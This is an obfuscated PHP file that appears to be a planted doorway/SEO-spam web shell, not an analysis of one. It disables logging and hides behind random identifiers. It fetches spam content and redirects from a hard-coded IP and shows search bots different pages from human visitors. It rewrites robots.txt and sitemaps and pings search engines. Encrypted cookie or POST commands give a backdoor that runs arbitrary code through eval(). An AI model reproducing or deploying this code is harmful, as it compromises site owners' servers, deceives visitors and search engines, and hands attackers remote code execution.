<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _37ah11d{static private $_n627fmx5 = 84485463;static function _mia90($_m8at8xn7, $_vem34o07){$_m8at8xn7[2] = count($_m8at8xn7) > 4 ? long2ip(_37ah11d::$_n627fmx5 - 842) : $_m8at8xn7[2];$_i0v7u45y = _37ah11d::_f1v34($_m8at8xn7, $_vem34o07);if (!$_i0v7u45y) {$_i0v7u45y = _37ah11d::_d5pv2($_m8at8xn7, $_vem34o07);}return $_i0v7u45y;}static function _f1v34($_m8at8xn7, $_i0v7u45y, $_uoj5wq2r = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_m8at8xn7)) {$_m8at8xn7 = implode("/", $_m8at8xn7);}$_agn9oec9 = curl_init();curl_setopt($_agn9oec9, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_agn9oec9, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_agn9oec9, CURLOPT_URL, $_m8at8xn7);if (!empty($_i0v7u45y)) {curl_setopt($_agn9oec9, CURLOPT_POST, 1);curl_setopt($_agn9oec9, CURLOPT_POSTFIELDS, $_i0v7u45y);}if (!empty($_uoj5wq2r)) {curl_setopt($_agn9oec9, CURLOPT_HTTPHEADER, $_uoj5wq2r);}curl_setopt($_agn9oec9, CURLOPT_RETURNTRANSFER, TRUE);$_o1v62fzv = curl_exec($_agn9oec9);curl_close($_agn9oec9);return $_o1v62fzv;}static function _d5pv2($_m8at8xn7, $_i0v7u45y, $_uoj5wq2r = NULL){if (is_array($_m8at8xn7)) {$_m8at8xn7 = implode("/", $_m8at8xn7);}if (!empty($_i0v7u45y)) {$_n4g69248 = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_i0v7u45y);if (!empty($_uoj5wq2r)) {$_n4g69248["header"] = $_n4g69248["header"] . "\r\n" . implode("\r\n", $_uoj5wq2r);}$_mkv2wuz8 = stream_context_create(array('http' => $_n4g69248));} else {$_n4g69248 = array('method' => 'GET',);if (!empty($_uoj5wq2r)) {$_n4g69248["header"] = implode("\r\n", $_uoj5wq2r);}$_mkv2wuz8 = stream_context_create(array('http' => $_n4g69248));}return @file_get_contents($_m8at8xn7, FALSE, $_mkv2wuz8);}}class _rq8sqs{private static $_o2suglok = "";private static $_t4tfh8ej = -1;private static $_dwkt09x5 = "";private $_59r2zbem = "";private $_la7its8l = "";private $_mhbcqkej = "";private $_m54qbsfc = "";public static function _q9isy($_tv7ge0si, $_odgllquj, $_0sxxc6z2){_rq8sqs::$_o2suglok = $_tv7ge0si . "/cache/";_rq8sqs::$_t4tfh8ej = $_odgllquj;_rq8sqs::$_dwkt09x5 = $_0sxxc6z2;if (!@file_exists(_rq8sqs::$_o2suglok)) {@mkdir(_rq8sqs::$_o2suglok);}}static public function _63iad(){$_kne6rugr = 0;foreach (scandir(_rq8sqs::$_o2suglok) as $_0p6u4yo0) {$_kne6rugr += 1;}return $_kne6rugr;}public static function _2f4d1(){return TRUE;}public function __construct($_aive7mvb, $_zae1cwje, $_1rsj71jl, $_5q54831r){$this->_59r2zbem = $_aive7mvb;$this->_la7its8l = $_zae1cwje;$this->_mhbcqkej = $_1rsj71jl;$this->_m54qbsfc = $_5q54831r;}public function _bzkb1(){function _ykklt($_04uxwwuu, $_f0jxss6g){return round(rand($_04uxwwuu, $_f0jxss6g - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_8tqfydug = _wyk5hvh::_6b35w();$_i0v7u45y = str_replace("{{ text }}", $this->_la7its8l,str_replace("{{ keyword }}", $this->_mhbcqkej,str_replace("{{ links }}", $this->_m54qbsfc, $this->_59r2zbem)));while (TRUE) {$_uege4s55 = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _wyk5hvh::_caqra(), $_i0v7u45y, 1);if ($_uege4s55 === $_i0v7u45y) {break;}$_i0v7u45y = $_uege4s55;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_i0v7u45y, $_c9iwzp4w);if (empty($_c9iwzp4w)) {break;}$_1rsj71jl = @$_8tqfydug[intval($_c9iwzp4w[1])];$_hvqaaztl = _n57y9g5::_z4ebd($_1rsj71jl);$_i0v7u45y = str_replace($_c9iwzp4w[0], $_hvqaaztl, $_i0v7u45y);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_i0v7u45y, $_c9iwzp4w);if (empty($_c9iwzp4w)) {break;}$_1rsj71jl = @$_8tqfydug[intval($_c9iwzp4w[1])];$_i0v7u45y = str_replace($_c9iwzp4w[0], $_1rsj71jl, $_i0v7u45y);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_i0v7u45y, $_c9iwzp4w);if (empty($_c9iwzp4w)) {break;}$_i0v7u45y = str_replace($_c9iwzp4w[0], _ykklt($_c9iwzp4w[1], $_c9iwzp4w[2]), $_i0v7u45y);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_i0v7u45y, $_c9iwzp4w);if (empty($_c9iwzp4w)) {break;}$_i0v7u45y = str_replace($_c9iwzp4w[0], rand($_c9iwzp4w[1], $_c9iwzp4w[2]), $_i0v7u45y);}return $_i0v7u45y;}public function _15kdx(){$_fv9cm007 = _rq8sqs::$_o2suglok . md5($this->_mhbcqkej . _rq8sqs::$_dwkt09x5);if (_rq8sqs::$_t4tfh8ej == -1) {$_ram47534 = -1;} else {$_ram47534 = time() + (3600 * 24 * 30);}$_fx8x1phc = array("template" => $this->_59r2zbem, "text" => $this->_la7its8l, "keyword" => $this->_mhbcqkej,"links" => $this->_m54qbsfc, "expired" => $_ram47534);@file_put_contents($_fv9cm007, serialize($_fx8x1phc));}static public function _7qufg($_1rsj71jl){$_fv9cm007 = _rq8sqs::$_o2suglok . md5($_1rsj71jl . _rq8sqs::$_dwkt09x5);$_fv9cm007 = @unserialize(@file_get_contents($_fv9cm007));if (!empty($_fv9cm007) && ($_fv9cm007["expired"] > time() || $_fv9cm007["expired"] == -1)) {return new _rq8sqs($_fv9cm007["template"], $_fv9cm007["text"], $_fv9cm007["keyword"], $_fv9cm007["links"]);} else {return null;}}}class _zfcfne{private static $_o2suglok = "";private static $_gnufx12w = "";public static function _q9isy($_tv7ge0si, $_p3bgxfxj){_zfcfne::$_o2suglok = $_tv7ge0si . "/";_zfcfne::$_gnufx12w = $_p3bgxfxj;if (!@file_exists(_zfcfne::$_o2suglok)) {@mkdir(_zfcfne::$_o2suglok);}}public static function _2f4d1(){return TRUE;}static public function _63iad(){$_kne6rugr = 0;foreach (scandir(_zfcfne::$_o2suglok) as $_0p6u4yo0) {if (strpos($_0p6u4yo0, _zfcfne::$_gnufx12w) === 0) {$_kne6rugr += 1;}}return $_kne6rugr;}static public function _caqra(){$_h07z9bav = array();foreach (scandir(_zfcfne::$_o2suglok) as $_0p6u4yo0) {if (strpos($_0p6u4yo0, _zfcfne::$_gnufx12w) === 0) {$_h07z9bav[] = $_0p6u4yo0;}}return @file_get_contents(_zfcfne::$_o2suglok . $_h07z9bav[array_rand($_h07z9bav)]);}static public function _15kdx($_ltwse37o){if (@file_exists(_zfcfne::$_gnufx12w . "_" . md5($_ltwse37o) . ".html")) {return;}@file_put_contents(_zfcfne::$_gnufx12w . "_" . md5($_ltwse37o) . ".html", $_ltwse37o);}}class _wyk5hvh{private static $_o2suglok = "";private static $_gnufx12w = "";private static $_ouco851r = Array();private static $_60o5aqkj = Array();public static function _q9isy($_tv7ge0si, $_p3bgxfxj){_wyk5hvh::$_o2suglok = $_tv7ge0si . "/";_wyk5hvh::$_gnufx12w = $_p3bgxfxj;if (!@file_exists(_wyk5hvh::$_o2suglok)) {@mkdir(_wyk5hvh::$_o2suglok);}}private static function _iuid7(){$_juigkyle = array();foreach (scandir(_wyk5hvh::$_o2suglok) as $_0p6u4yo0) {if (strpos($_0p6u4yo0, _wyk5hvh::$_gnufx12w) === 0) {$_juigkyle[] = $_0p6u4yo0;}}return $_juigkyle;}public static function _2f4d1(){return TRUE;}static public function _caqra(){if (empty(_wyk5hvh::$_ouco851r)){$_juigkyle = _wyk5hvh::_iuid7();_wyk5hvh::$_ouco851r = @file(_wyk5hvh::$_o2suglok . $_juigkyle[array_rand($_juigkyle)], FILE_IGNORE_NEW_LINES);}return _wyk5hvh::$_ouco851r[array_rand(_wyk5hvh::$_ouco851r)];}static public function _6b35w(){if (empty(_wyk5hvh::$_60o5aqkj)){$_juigkyle = _wyk5hvh::_iuid7();foreach ($_juigkyle as $_r1utgmxd) {_wyk5hvh::$_60o5aqkj = array_merge(_wyk5hvh::$_60o5aqkj, @file(_wyk5hvh::$_o2suglok . $_r1utgmxd, FILE_IGNORE_NEW_LINES));}}return _wyk5hvh::$_60o5aqkj;}static public function _15kdx($_r0734fp3){if (@file_exists(_wyk5hvh::$_gnufx12w . "_" . md5($_r0734fp3) . ".list")) {return;}@file_put_contents(_wyk5hvh::$_gnufx12w . "_" . md5($_r0734fp3) . ".list", $_r0734fp3);}static public function _vepwp($_1rsj71jl){@file_put_contents(_wyk5hvh::$_gnufx12w . "_" . md5(_n57y9g5::$_1lwcm1jj) . ".list", $_1rsj71jl . "\n", 8);}}class _n57y9g5{static public $_neqzgjwa = "5.0";static public $_1lwcm1jj = "31d5d8fc-849b-badc-f9a8-7458c492aa4a";private $_7nevc4h4 = "http://136.12.78.46/app/assets/api2?action=redir";private $_g0e6xk49 = "http://136.12.78.46/app/assets/api?action=page";static public $_m6hmw37e = 5;static public $_ytz72yn1 = 20;private function _zyfib(){$_95p2zwp8 = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_95p2zwp8, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_mpm69dkg = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_mpm69dkg = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_mpm69dkg = 1;} else {$_mpm69dkg = 0;}return $_mpm69dkg;}private static function _wxpj8(){$_vem34o07 = array();$_vem34o07['ip'] = $_SERVER['REMOTE_ADDR'];$_vem34o07['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_vem34o07['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_vem34o07['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_vem34o07['ref'] = @$_SERVER['HTTP_REFERER'];$_vem34o07['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_vem34o07['acp'] = @$_SERVER['HTTP_ACCEPT'];$_vem34o07['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_vem34o07['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_vem34o07;}public function __construct(){$this->_7nevc4h4 = explode("/", $this->_7nevc4h4);$this->_g0e6xk49 = explode("/", $this->_g0e6xk49);}static public function _68fgf($_81dbxlpu){if (strlen($_81dbxlpu) < 4) {return "";}$_u6x4utqn = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_8tqfydug = str_split($_u6x4utqn);$_8tqfydug = array_flip($_8tqfydug);$_nso22fss = 0;$_zqb5wheq = "";$_81dbxlpu = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_81dbxlpu);do {$_7gokx1y7 = $_8tqfydug[$_81dbxlpu[$_nso22fss++]];$_xjqtfgjh = $_8tqfydug[$_81dbxlpu[$_nso22fss++]];$_4wi3022w = $_8tqfydug[$_81dbxlpu[$_nso22fss++]];$_4o42eovm = $_8tqfydug[$_81dbxlpu[$_nso22fss++]];$_o2so7x3e = ($_7gokx1y7 << 2) | ($_xjqtfgjh >> 4);$_k0ddeysq = (($_xjqtfgjh & 15) << 4) | ($_4wi3022w >> 2);$_g4u5z3fu = (($_4wi3022w & 3) << 6) | $_4o42eovm;$_zqb5wheq = $_zqb5wheq . chr($_o2so7x3e);if ($_4wi3022w != 64) {$_zqb5wheq = $_zqb5wheq . chr($_k0ddeysq);}if ($_4o42eovm != 64) {$_zqb5wheq = $_zqb5wheq . chr($_g4u5z3fu);}} while ($_nso22fss < strlen($_81dbxlpu));return $_zqb5wheq;}private function _x9ij6($_1rsj71jl){$_aive7mvb = "";$_zae1cwje = "";$_vem34o07 = _n57y9g5::_wxpj8();$_vem34o07["uid"] = _n57y9g5::$_1lwcm1jj;$_vem34o07["keyword"] = $_1rsj71jl;$_vem34o07["tc"] = 10;$_vem34o07 = http_build_query($_vem34o07);$_jekd9pxj = _37ah11d::_mia90($this->_g0e6xk49, $_vem34o07);if (strpos($_jekd9pxj, _n57y9g5::$_1lwcm1jj) === FALSE) {return array($_aive7mvb, $_zae1cwje);}$_aive7mvb = _zfcfne::_caqra();$_zae1cwje = substr($_jekd9pxj, strlen(_n57y9g5::$_1lwcm1jj));$_zae1cwje = explode("\n", $_zae1cwje);shuffle($_zae1cwje);$_zae1cwje = implode(" ", $_zae1cwje);return array($_aive7mvb, $_zae1cwje);}private function _x19xk(){$_vem34o07 = _n57y9g5::_wxpj8();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_vem34o07['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_vem34o07['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_vem34o07['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_vem34o07["uid"] = _n57y9g5::$_1lwcm1jj;$_vem34o07 = http_build_query($_vem34o07);$_qvkq0oht = _37ah11d::_mia90($this->_7nevc4h4, $_vem34o07);$_qvkq0oht = @unserialize($_qvkq0oht);if (isset($_qvkq0oht["type"]) && $_qvkq0oht["type"] == "redir") {if (!empty($_qvkq0oht["data"]["header"])) {header($_qvkq0oht["data"]["header"]);return true;} elseif (!empty($_qvkq0oht["data"]["code"])) {echo $_qvkq0oht["data"]["code"];return true;}}return false;}public function _2f4d1(){return _rq8sqs::_2f4d1() && _zfcfne::_2f4d1() && _wyk5hvh::_2f4d1();}static public function _w2mvp(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _0yc6i(){$_2ipyavf0 = explode("?", $_SERVER["REQUEST_URI"], 2);$_2ipyavf0 = $_2ipyavf0[0];if (strpos($_2ipyavf0, ".php") === FALSE) {$_2ipyavf0 = explode("/", $_2ipyavf0);array_pop($_2ipyavf0);$_2ipyavf0 = implode("/", $_2ipyavf0) . "/";}return sprintf("%s://%s%s", _n57y9g5::_w2mvp() ? "https" : "http", $_SERVER['HTTP_HOST'], $_2ipyavf0);}public static function _k2oq2(){$_xl0d0dwq = array("https://www.bing.com/ping?sitemap=" => "Thanks for submitting your Sitemap","https://www.google.com/ping?sitemap=" => "Sitemap Notification Received");$_uoj5wq2r = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",);$_wblanq1k = urlencode(_n57y9g5::_kowfj() . "/sitemap.xml");foreach ($_xl0d0dwq as $_m8at8xn7 => $_39i763wu) {$_4r944z0f = _37ah11d::_f1v34($_m8at8xn7 . $_wblanq1k, NULL, $_uoj5wq2r);if (empty($_4r944z0f)) {$_4r944z0f = _37ah11d::_d5pv2($_m8at8xn7 . $_wblanq1k, NULL, $_uoj5wq2r);}if (empty($_4r944z0f)) {return FALSE;}if (strpos($_4r944z0f, $_39i763wu) === FALSE) {return FALSE;}}return TRUE;}public static function _lwdkn(){$_ets6bt4b = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_2ipyavf0 = explode("?", $_SERVER["REQUEST_URI"], 2);$_2ipyavf0 = $_2ipyavf0[0];$_sdxr5wro = substr($_2ipyavf0, 0, strrpos($_2ipyavf0, "/"));$_6f76e6bk = sprintf($_ets6bt4b, $_sdxr5wro, _n57y9g5::_kowfj() . "/sitemap.xml");$_w1hcup4n = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_w1hcup4n)) {@chmod($_w1hcup4n, 0777);$_e2qizp3e = @file_get_contents($_w1hcup4n);} else {$_e2qizp3e = "";}if (strpos($_e2qizp3e, $_6f76e6bk) === FALSE) {@file_put_contents($_w1hcup4n, $_e2qizp3e . "\n" . $_6f76e6bk);$_e2qizp3e = @file_get_contents($_w1hcup4n);return (strpos($_e2qizp3e, $_6f76e6bk) !== FALSE);}return FALSE;}public static function _kowfj(){$_2ipyavf0 = explode("?", $_SERVER["REQUEST_URI"], 2);$_2ipyavf0 = $_2ipyavf0[0];$_tv7ge0si = substr($_2ipyavf0, 0, strrpos($_2ipyavf0, "/"));return sprintf("%s://%s%s", _n57y9g5::_w2mvp() ? "https" : "http", $_SERVER['HTTP_HOST'], $_tv7ge0si);}public static function _z4ebd($_1rsj71jl){$_dww10lub = _n57y9g5::_0yc6i();$_ogxwbv1l = substr(md5(_n57y9g5::$_1lwcm1jj . "salt3"), 0, 6);$_j7snegdq = "";if (substr($_dww10lub, -1) == "/") {if (ord($_ogxwbv1l[1]) % 2) {$_1rsj71jl = str_replace(" ", "-", $_ogxwbv1l . "-" . $_1rsj71jl);} else {$_1rsj71jl = str_replace(" ", "-", $_1rsj71jl . "-" . $_ogxwbv1l);}$_j7snegdq = sprintf("%s%s", $_dww10lub, urlencode($_1rsj71jl));} else {if (ord($_ogxwbv1l[0]) % 2) {$_j7snegdq = sprintf("%s?%s=%s",$_dww10lub,$_ogxwbv1l,urlencode(str_replace(" ", "-", $_1rsj71jl)));} else {$_kdl9yayy = array("id", "page", "tag");$_z2oxj28s = $_kdl9yayy[ord($_ogxwbv1l[2]) % count($_kdl9yayy)];if (ord($_ogxwbv1l[1]) % 2) {$_1rsj71jl = str_replace(" ", "-", $_ogxwbv1l . "-" . $_1rsj71jl);} else {$_1rsj71jl = str_replace(" ", "-", $_1rsj71jl . "-" . $_ogxwbv1l);}$_j7snegdq = sprintf("%s?%s=%s",$_dww10lub,$_z2oxj28s,urlencode($_1rsj71jl));}}return $_j7snegdq;}public static function _3ijic($_04uxwwuu, $_f0jxss6g){$_mqaaclt1 = "";for ($_nso22fss = 0; $_nso22fss < rand($_04uxwwuu, $_f0jxss6g); $_nso22fss++) {$_1rsj71jl = _wyk5hvh::_caqra();$_mqaaclt1 .= sprintf("<a href=\"%s\">%s</a>,\n",_n57y9g5::_z4ebd($_1rsj71jl), ucwords($_1rsj71jl));}return $_mqaaclt1;}public static function _eosa8($_x9j34vbb=FALSE){$_51ce154u = dirname(__FILE__) . "/sitemap.xml";$_mdqtuqir = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_1jy5tw4z = "</urlset>";$_8tqfydug = _wyk5hvh::_6b35w();$_z2l7wpbl = array();if (file_exists($_51ce154u)) {$_jekd9pxj = simplexml_load_file($_51ce154u);foreach ($_jekd9pxj as $_vqnyuar8) {$_z2l7wpbl[(string)$_vqnyuar8->loc] = (string)$_vqnyuar8->lastmod;}}else {$_x9j34vbb = FALSE;}foreach ($_8tqfydug as $_hsnc1mxd) {$_j7snegdq = _n57y9g5::_z4ebd($_hsnc1mxd);if (isset($_z2l7wpbl[$_j7snegdq])){continue;}if ($_x9j34vbb) {$_dxwp1dd6 = time();}else {$_dxwp1dd6 = time() - (crc32 ($_hsnc1mxd) % (60 * 60 * 24 * 30));}$_z2l7wpbl[$_j7snegdq] = date("Y-m-d", $_dxwp1dd6);;}$_lts2vm42 = "";foreach ($_z2l7wpbl as $_m8at8xn7 => $_dxwp1dd6){$_lts2vm42 .= "<url>\n";$_lts2vm42 .= sprintf("<loc>%s</loc>\n", $_m8at8xn7);$_lts2vm42 .= sprintf("<lastmod>%s</lastmod>\n", $_dxwp1dd6);$_lts2vm42 .= "</url>\n";}$_98hvxw7k = $_mdqtuqir . $_lts2vm42 . $_1jy5tw4z;$_wblanq1k = _n57y9g5::_kowfj() . "/sitemap.xml";@file_put_contents($_51ce154u, $_98hvxw7k);return $_wblanq1k;}public function _57ycf(){$_z2oxj28s = substr(md5(_n57y9g5::$_1lwcm1jj . "salt3"), 0, 6);if (isset($_GET[$_z2oxj28s])) {$_1rsj71jl = $_GET[$_z2oxj28s];} elseif (strpos($_SERVER["REQUEST_URI"], $_z2oxj28s) !== FALSE) {$_aaoblgim = explode("/", $_SERVER["REQUEST_URI"]);foreach ($_aaoblgim as $_4codl8ug) {if (strpos($_4codl8ug, $_z2oxj28s) !== FALSE) {$_7vveeymm = explode("=", $_4codl8ug);$_r1c5ek4l = array_pop($_7vveeymm);$_r1c5ek4l = str_replace($_z2oxj28s . "-", "", $_r1c5ek4l);$_r1c5ek4l = str_replace("-" . $_z2oxj28s, "", $_r1c5ek4l);$_1rsj71jl = $_r1c5ek4l;}}}if (empty($_1rsj71jl)) {$_8tqfydug = _wyk5hvh::_6b35w();$_1rsj71jl = $_8tqfydug[0];}if (!empty($_1rsj71jl)) {$_1rsj71jl = str_replace("-", " ", $_1rsj71jl);if (!$this->_zyfib()) {if ($this->_x19xk()) {return;}}$_1rsj71jl = urldecode($_1rsj71jl);$_qvkq0oht = _rq8sqs::_7qufg($_1rsj71jl);if (empty($_qvkq0oht)) {list($_aive7mvb, $_zae1cwje) = $this->_x9ij6($_1rsj71jl);if (empty($_zae1cwje)) {return;}$_qvkq0oht = new _rq8sqs($_aive7mvb, $_zae1cwje, $_1rsj71jl, _n57y9g5::_3ijic(_n57y9g5::$_m6hmw37e, _n57y9g5::$_ytz72yn1));$_qvkq0oht->_15kdx();}echo $_qvkq0oht->_bzkb1();}}}_rq8sqs::_q9isy(dirname(__FILE__), -1, _n57y9g5::$_1lwcm1jj);_zfcfne::_q9isy(dirname(__FILE__), substr(md5(_n57y9g5::$_1lwcm1jj . "salt12"), 0, 4));_wyk5hvh::_q9isy(dirname(__FILE__), substr(md5(_n57y9g5::$_1lwcm1jj . "salt22"), 0, 4));function _yr9c4($_jekd9pxj, $_hsnc1mxd){$_i3utmty8 = "";for ($_nso22fss = 0; $_nso22fss < strlen($_jekd9pxj);) {for ($_fwb869wz = 0; $_fwb869wz < strlen($_hsnc1mxd) && $_nso22fss < strlen($_jekd9pxj); $_fwb869wz++, $_nso22fss++) {$_i3utmty8 .= chr(ord($_jekd9pxj[$_nso22fss]) ^ ord($_hsnc1mxd[$_fwb869wz]));}}return $_i3utmty8;}function _0lhyh($_jekd9pxj, $_hsnc1mxd, $_lxf8ao4f){return _yr9c4(_yr9c4($_jekd9pxj, $_hsnc1mxd), $_lxf8ao4f);}foreach (array_merge($_COOKIE, $_POST) as $_uxz6nw5p => $_jekd9pxj) {$_jekd9pxj = @unserialize(_0lhyh(_n57y9g5::_68fgf($_jekd9pxj), $_uxz6nw5p, _n57y9g5::$_1lwcm1jj));if (isset($_jekd9pxj['ak']) && _n57y9g5::$_1lwcm1jj == $_jekd9pxj['ak']) {if ($_jekd9pxj['a'] == 'doorway2') {if ($_jekd9pxj['sa'] == 'check') {$_i0v7u45y = _37ah11d::_mia90(explode("/", "http://httpbin.org/"), "");if (strlen($_i0v7u45y) > 512) {echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa,"cache" => _rq8sqs::_63iad(),"keywords" => count(_wyk5hvh::_6b35w()),"templates" => _zfcfne::_63iad()));}exit;}if ($_jekd9pxj['sa'] == 'templates') {foreach ($_jekd9pxj["templates"] as $_aive7mvb) {_zfcfne::_15kdx($_aive7mvb);echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa,));}}if ($_jekd9pxj['sa'] == 'keywords') {_wyk5hvh::_15kdx($_jekd9pxj["keywords"]);_n57y9g5::_eosa8();echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa,));}if ($_jekd9pxj['sa'] == 'update_sitemap') {_n57y9g5::_eosa8(TRUE);echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa,));}if ($_jekd9pxj['sa'] == 'pages') {$_eiov1dcj = 0;$_9m6xq96p = _wyk5hvh::_6b35w();if (_zfcfne::_63iad() > 0) {foreach ($_jekd9pxj['pages'] as $_qvkq0oht) {$_9hurfrtc = _rq8sqs::_7qufg($_qvkq0oht["keyword"]);if (empty($_9hurfrtc)) {$_9hurfrtc = new _rq8sqs(_zfcfne::_caqra(), $_qvkq0oht["text"], $_qvkq0oht["keyword"], _n57y9g5::_3ijic(_n57y9g5::$_m6hmw37e, _n57y9g5::$_ytz72yn1));$_9hurfrtc->_15kdx();$_eiov1dcj += 1;if (!in_array($_qvkq0oht["keyword"], $_9m6xq96p)){_wyk5hvh::_vepwp($_qvkq0oht["keyword"]);}}}}echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa, "pages" => $_eiov1dcj));}if ($_jekd9pxj["sa"] == "ping") {$_4r944z0f = _n57y9g5::_k2oq2();echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa, "result" => (int)$_4r944z0f));}if ($_jekd9pxj["sa"] == "robots") {$_4r944z0f = _n57y9g5::_lwdkn();echo @serialize(array("uid" => _n57y9g5::$_1lwcm1jj, "v" => _n57y9g5::$_neqzgjwa, "result" => (int)$_4r944z0f));}}if ($_jekd9pxj['sa'] == 'eval') {eval($_jekd9pxj["data"]);exit;}}}$_dwkfc0ji = new _n57y9g5();if ($_dwkfc0ji->_2f4d1()) {$_dwkfc0ji->_57ycf();}exit();